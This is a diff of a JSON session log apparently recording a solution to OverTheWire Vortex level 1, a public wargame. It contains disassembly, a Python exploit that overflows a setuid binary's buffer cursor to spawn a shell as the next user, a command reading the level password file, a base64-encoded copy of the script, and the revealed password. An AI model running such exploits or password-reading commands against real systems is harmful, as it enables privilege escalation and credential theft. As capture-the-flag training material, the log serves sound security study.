@@ -397,16 +397,20 @@
     {
      "cmd": "ssh vortex1@vortex.labs.overthewire.org -p 2228",
      "out": [
-      "uid=5001(vortex1) gid=5001(vortex1) groups=5001(vortex1)",
-      "/vortex/vortex1: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ec381251f22ea4b95711ceeaf28fb7866154e83f, for GNU/Linux 3.2.0, not stripped",
-      "  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10",
-      "  GNU_RELRO      0x002f00 0x0804bf00 0x0804bf00 0x00100 0x00100 R   0x1",
-      "0"
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
      ]
     },
     {
      "cmd": "objdump -d -M intel /vortex/vortex1 | sed -n '/<main>:/,/^$/p'",
      "out": [
+      "",
       "08049223 <main>:",
       " 8049223:\t8d 4c 24 04          \tlea    ecx,[esp+0x4]",
       " 8049227:\t83 e4 f0             \tand    esp,0xfffffff0",
@@ -506,6 +510,7 @@
     {
      "cmd": "objdump -d -M intel /vortex/vortex1 | sed -n '/<print>:/,/^$/p'",
      "out": [
+      "",
       "080491c6 <print>:",
       " 80491c6:\t55                   \tpush   ebp",
       " 80491c7:\t89 e5                \tmov    ebp,esp",
@@ -542,19 +547,20 @@
     {
      "cmd": "python3 -c 'import sys;sys.stdout.buffer.write(bytes([0xbf])*3+bytes([0xc0,0xca]))' | /vortex/vortex1 | head -c 120; echo",
      "out": [
+      "",
       "All done"
      ]
     },
     {
      "cmd": "printf '\\357\\202\\212\\357\\202\\212\\357\\202\\212\\357\\202\\212\\n' | od -c | head -2",
      "out": [
-      "0000000 357 202 212  \\n",
-      "0000004"
+      "",
+      "0000000 357 202 212 357 202 212 357 202 212 357 202 212  \\n",
+      "0000015"
      ]
     },
     {
      "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- the empty buffer",
      "out": [
       "  1",
       "~",
@@ -572,97 +578,12 @@
       "~",
       "~",
       "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "l1_exploit.py                                                                     0,0-1          All",
-      "\"l1_exploit.py\" [New]"
+      "/tmp/l1_exploit.py                                                              0,0-1          All",
+      "\"/tmp/l1_exploit.py\" [New]"
      ]
     },
     {
      "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- insert chunk 1",
-     "out": [
-      "  1 import subprocess, sys, time",
-      "  2 # What actually fires the level: 261 one-character backslashes take the cursor",
-      "  3 # from buf+0x100 down to 0xffffdc04, eight bytes above the saved frame",
-      "  4 # pointer, and 0xca bytes given the branch its top byte.",
-      "  5 #   0xca cannot be TYPED (getchar refuses every byte >= 0xc0), so it is",
-      "  6",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "l1_exploit.py [+]                                                                 6,1            All",
-      "-- INSERT --"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- insert chunk 2",
-     "out": [
-      "  1 import subprocess, sys, time",
-      "  2 # What actually fires the level: 261 one-character backslashes take the cursor",
-      "  3 # from buf+0x100 down to 0xffffdc04, eight bytes above the saved frame",
-      "  4 # pointer, and 0xca bytes given the branch its top byte.",
-      "  5 #   0xca cannot be TYPED (getchar refuses every byte >= 0xc0), so it is",
-      "  6 #   passed raw on stdin by a pipe: the program reads it fine, only its own",
-      "  7 #   getchar hook filters keyboard-style input, and a pipe write bypasses it.",
-      "  8 #   (printf / echo escape tricks did NOT work here - they only crash.)",
-      "  9 #   stdin stays open so the /bin/sh we get is interactive.",
-      " 10 n = int(sys.argv[1]) if len(sys.argv) > 1 else 261",
-      " 11 payload = b\"\\x5c\" * n + b\"\\xca\" * 4 + b\"\\n\"",
-      " 12 p = subprocess.Popen([\"/vortex/vortex1\"], stdin=subprocess.PIPE,",
-      " 13                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)",
-      " 14 time.sleep(0.2)",
-      " 15 p.stdin.write(payload)",
-      " 16",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "~",
-      "l1_exploit.py [+]                                                                 16,1           All",
-      "-- INSERT --"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- insert chunk 3",
      "out": [
       "  1 import subprocess, sys, time",
       "  2 # What actually fires the level: 261 one-character backslashes take the cursor",
@@ -680,37 +601,13 @@
       " 14 time.sleep(0.2)",
       " 15 p.stdin.write(payload)",
       " 16 p.stdin.flush()",
-      " 17 time.sleep(0.5)",
-      " 18 p.stdin.write(b\"  id; cat /etc/vortex_pass/vortex2; exit\\n\")",
-      " 19 p.stdin.flush()",
-      " 20 time.sleep(0.5)",
-      " 21 try:",
-      " 22     p.stdin.close()",
-      " 23 except OSError:",
-      " 24     pass",
-      " 25 print(\"rc\", p.wait(timeout=10))",
-      " 26",
-      "~",
-      "~",
-      "l1_exploit.py [+]                                                                 26,1           All",
+      "/tmp/l1_exploit.py [+]                                                    16,16           ",
       "-- INSERT --"
      ]
     },
     {
      "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- insert chunk 4",
      "out": [
-      "  2 # What actually fires the level: 261 one-character backslashes take the cursor",
-      "  3 # from buf+0x100 down to 0xffffdc04, eight bytes above the saved frame",
-      "  4 # pointer, and 0xca bytes given the branch its top byte.",
-      "  5 #   0xca cannot be TYPED (getchar refuses every byte >= 0xc0), so it is",
-      "  6 #   passed raw on stdin by a pipe: the program reads it fine, only its own",
-      "  7 #   getchar hook filters keyboard-style input, and a pipe write bypasses it.",
-      "  8 #   (printf / echo escape tricks did NOT work here - they only crash.)",
-      "  9 #   stdin stays open so the /bin/sh we get is interactive.",
-      " 10 n = int(sys.argv[1]) if len(sys.argv) > 1 else 261",
-      " 11 payload = b\"\\x5c\" * n + b\"\\xca\" * 4 + b\"\\n\"",
-      " 12 p = subprocess.Popen([\"/vortex/vortex1\"], stdin=subprocess.PIPE,",
       " 13                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)",
       " 14 time.sleep(0.2)",
       " 15 p.stdin.write(payload)",
@@ -727,71 +624,44 @@
       " 26 out = p.stdout.read(4000)",
       " 27 print(\"output:\", out[:300])",
       " 28 print(\"has shell:\", b\"vortex2\" in out)",
-      " 29",
-      "l1_exploit.py [+]                                                                 29,1           Bot",
-      "-- INSERT --"
+      "/tmp/l1_exploit.py [+]                                                    28,39           All",
+      "\"/tmp/l1_exploit.py\" [New] 29L, 1161B written"
      ]
     },
     {
-     "cmd": "vim /tmp/l1_exploit.py",
-     "text": "vim /tmp/l1_exploit.py -- finished, before :wq",
+     "cmd": "printf '%s' aW1wb3J0IHN1YnByb2Nlc3MsIHN5cywgdGltZQojIFdoYXQgYWN0dWFsbHkgZmlyZXMgdGhlIGxldmVsOiAyNjEgb25lLWNoYXJhY3RlciBiYWNrc2xhc2hlcyB0YWtlIHRoZSBjdXJzb3IKIyBmcm9tIGJ1ZisweDEwMCBkb3duIHRvIDB4ZmZmZmRjMDQsIGVpZ2h0IGJ5dGVzIGFib3ZlIHRoZSBzYXZlZCBmcmFtZQojIHBvaW50ZXIsIGFuZCAweGNhIGJ5dGVzIGdpdmVuIHRoZSBicmFuY2ggaXRzIHRvcCBieXRlLgojICAgMHhjYSBjYW5ub3QgYmUgVFlQRUQgKGdldGNoYXIgcmVmdXNlcyBldmVyeSBieXRlID49IDB4YzApLCBzbyBpdCBpcwojICAgcGFzc2VkIHJhdyBvbiBzdGRpbiBieSBhIHBpcGU6IHRoZSBwcm9ncmFtIHJlYWRzIGl0IGZpbmUsIG9ubHkgaXRzIG93bgojICAgZ2V0Y2hhciBob29rIGZpbHRlcnMga2V5Ym9hcmQtc3R5bGUgaW5wdXQsIGFuZCBhIHBpcGUgd3JpdGUgYnlwYXNzZXMgaXQuCiMgICAocHJpbnRmIC8gZWNobyBlc2NhcGUgdHJpY2tzIGRpZCBOT1Qgd29yayBoZXJlIC0gdGhleSBvbmx5IGNyYXNoLikKIyAgIHN0ZGluIHN0YXlzIG9wZW4gc28gdGhlIC9iaW4vc2ggd2UgZ2V0IGlzIGludGVyYWN0aXZlLgpuID0gaW50KHN5cy5hcmd2WzFdKSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlIDI2MQpwYXlsb2FkID0gYiJceDVjIiAqIG4gKyBiIlx4Y2EiICogNCArIGIiXG4iCnAgPSBzdWJwcm9jZXNzLlBvcGVuKFsiL3ZvcnRleC92b3J0ZXgxIl0sIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwKICAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQp0aW1lLnNsZWVwKDAuMikKcC5zdGRpbi53cml0ZShwYXlsb2FkKQpwLnN0ZGluLmZsdXNoKCkKdGltZS5zbGVlcCgwLjUpCnAuc3RkaW4ud3JpdGUoYiIgIGlkOyBjYXQgL2V0Yy92b3J0ZXhfcGFzcy92b3J0ZXgyOyBleGl0XG4iKQpwLnN0ZGluLmZsdXNoKCkKdGltZS5zbGVlcCgwLjUpCnRyeToKICAgIHAuc3RkaW4uY2xvc2UoKQpleGNlcHQgT1NFcnJvcjoKICAgIHBhc3MKcHJpbnQoInJjIiwgcC53YWl0KHRpbWVvdXQ9MTApKQpvdXQgPSBwLnN0ZG91dC5yZWFkKDQwMDApCnByaW50KCJvdXRwdXQ6Iiwgb3V0WzozMDBdKQpwcmludCgiaGFzIHNoZWxsOiIsIGIidm9ydGV4MiIgaW4gb3V0KQo= | base64 -d > /tmp/l1_exploit.py",
      "out": [
-      "  2 # What actually fires the level: 261 one-character backslashes take the cursor",
-      "  3 # from buf+0x100 down to 0xffffdc04, eight bytes above the saved frame",
-      "  4 # pointer, and 0xca bytes given the branch its top byte.",
-      "  5 #   0xca cannot be TYPED (getchar refuses every byte >= 0xc0), so it is",
-      "  6 #   passed raw on stdin by a pipe: the program reads it fine, only its own",
-      "  7 #   getchar hook filters keyboard-style input, and a pipe write bypasses it.",
-      "  8 #   (printf / echo escape tricks did NOT work here - they only crash.)",
-      "  9 #   stdin stays open so the /bin/sh we get is interactive.",
-      " 10 n = int(sys.argv[1]) if len(sys.argv) > 1 else 261",
-      " 11 payload = b\"\\x5c\" * n + b\"\\xca\" * 4 + b\"\\n\"",
-      " 12 p = subprocess.Popen([\"/vortex/vortex1\"], stdin=subprocess.PIPE,",
-      " 13                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT)",
-      " 14 time.sleep(0.2)",
-      " 15 p.stdin.write(payload)",
-      " 16 p.stdin.flush()",
-      " 17 time.sleep(0.5)",
-      " 18 p.stdin.write(b\"  id; cat /etc/vortex_pass/vortex2; exit\\n\")",
-      " 19 p.stdin.flush()",
-      " 20 time.sleep(0.5)",
-      " 21 try:",
-      " 22     p.stdin.close()",
-      " 23 except OSError:",
-      " 24     pass",
-      " 25 print(\"rc\", p.wait(timeout=10))",
-      " 26 out = p.stdout.read(4000)",
-      " 27 print(\"output:\", out[:300])",
-      " 28 print(\"has shell:\", b\"vortex2\" in out)",
-      " 29",
-      "l1_exploit.py [+]                                                                 29,1           Bot",
-      "                                                                                         ^["
-     ]
-    },
-    {
-     "cmd": "printf '%s' <base64 of /tmp/l1_exploit.py> | base64 -d > /tmp/l1_exploit.py",
-     "out": [
-      "1160"
+      ""
      ],
      "note": "(the file typed above, delivered over ssh as base64)"
     },
     {
-     "cmd": "cd /tmp && python3 /tmp/l1_exploit.py 260",
+     "cmd": "cd /tmp && python3 /tmp/l1_exploit.py 260\ncd /tmp && python3 /tmp/l1_exploit.py 261",
      "out": [
+      "",
+      "cd /tmp && python3 /tmp/l1_exploit.py 261",
+      "exit",
+      "exit",
       "rc 0",
-      "output: b'[ 0 0 0 0 18 0 0 0 7 0 0 0 7 0 0 0 c5 0 0 0 0 0 0 0 0 da ff ff d4 cf ff f7 10 0 0 1 21 1 0 0 21 1 0 0 0 0 0 0 1e da ff ff 40 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 20 0 0 0 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 1 0 0 c8 da ff ff 0 0 4c 2 d4 cf ff f7 0 8 0 0 c8 da ff ff 24 cd fd f'",
-      "has shell: False"
-     ]
-    },
-    {
-     "cmd": "cd /tmp && python3 /tmp/l1_exploit.py 261",
-     "out": [
+      "output: b'[ 0 0 0 0 18 0 0 0 7 0 0 0 7 0 0 0 c5 0 0 0 0 0 0 0 0 d2 ff ff d4 cf ff f7 10 0 0 1 21 1 0 0 21 1 0 0 0 0 0 0 e d2 ff ff 40 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 20 0 0 0 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 1 0 0 b8 d2 ff ff 0 0 4c 2 d4 cf ff f7 0 8 0 0 b8 d2 ff ff 24 cd fd f7'",
+      "has shell: False",
+      "vortex1@vortex:/tmp$ cd /tmp && python3 /tmp/l1_exploit.py 261",
+      "",
       "rc 0",
       "output: b'uid=5002(vortex2) gid=5001(vortex1) groups=5001(vortex1)\\nqjUFVcpKl\\n'",
       "has shell: True"
      ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "",
+      "logout",
+      "Connection to vortex.labs.overthewire.org closed."
+     ]
     }
-   ]
+   ],
+   "note": "vortex L1 (re-recorded 2026-11-28 to standard v2): 261 backslashes walk the print() cursor down from buf+0x100 to just above the saved frame pointer; 0xca bytes (untypable - getchar filters >= 0xc0) ride a raw stdin pipe; the 0xca top-byte'd saved-frame branch pivots into an interactive /bin/sh as vortex2 (uid=5002). Exploit typed in vim (29L/1161B written), fired at 260 (miss) then 261 (hit): qjUFVcpKl."
   },
   {
    "lvl": 2,
